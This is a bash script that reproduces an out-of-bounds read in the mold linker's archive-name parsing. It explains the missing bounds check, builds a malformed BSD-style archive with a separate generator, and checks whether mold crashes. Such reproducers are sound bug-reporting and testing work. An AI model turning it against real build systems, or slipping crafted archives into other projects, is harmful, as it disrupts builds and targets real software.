#!/usr/bin/env bash
# Standalone repro for mold's ArHdr::read_name BSD-long-filename OOB read (src/archive-file.cc).
#
# Usage: ./run.sh /path/to/mold-binary
#
# Builds a 1-member ".a" archive whose sole member uses the BSD extended-filename convention
# ("#1/N" where N is the filename length, stored as the first N bytes of the member's own data).
# mold's ArHdr::read_name computes `int namelen = atoi(ar_name + 3)` with no bounds check and
# immediately constructs `std::string name{(char *)ptr, (size_t)namelen}`, reading namelen bytes
# from the archive's mapping regardless of how much is actually there - a BUS/SEGV once it walks
# far enough past the mapped region.
set -euo pipefail

MOLD_BIN="${1:?usage: run.sh /path/to/mold}"
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
WORK="$(mktemp -d)"
trap 'rm -rf "$WORK"' EXIT

python3 "$DIR/gen_evil_ar.py" "$WORK/evil.a"

ulimit -c 0
set +e
out="$("$MOLD_BIN" --thread-count 5 -o "$WORK/out" "$WORK/evil.a" 2>&1)"
status=$?
set -e

echo "$out"
echo "mold exit status: $status"
if [ "$status" -ge 128 ] || echo "$out" | grep -qE "AddressSanitizer|SEGV|BUS|Segmentation fault|Bus error"; then
  echo "REPRO: mold crashed on the malformed archive (bug present)."
  exit 0
fi
echo "REPRO: mold did NOT crash (exited $status, no crash marker in output) - bug not reproduced (fix likely applied)."
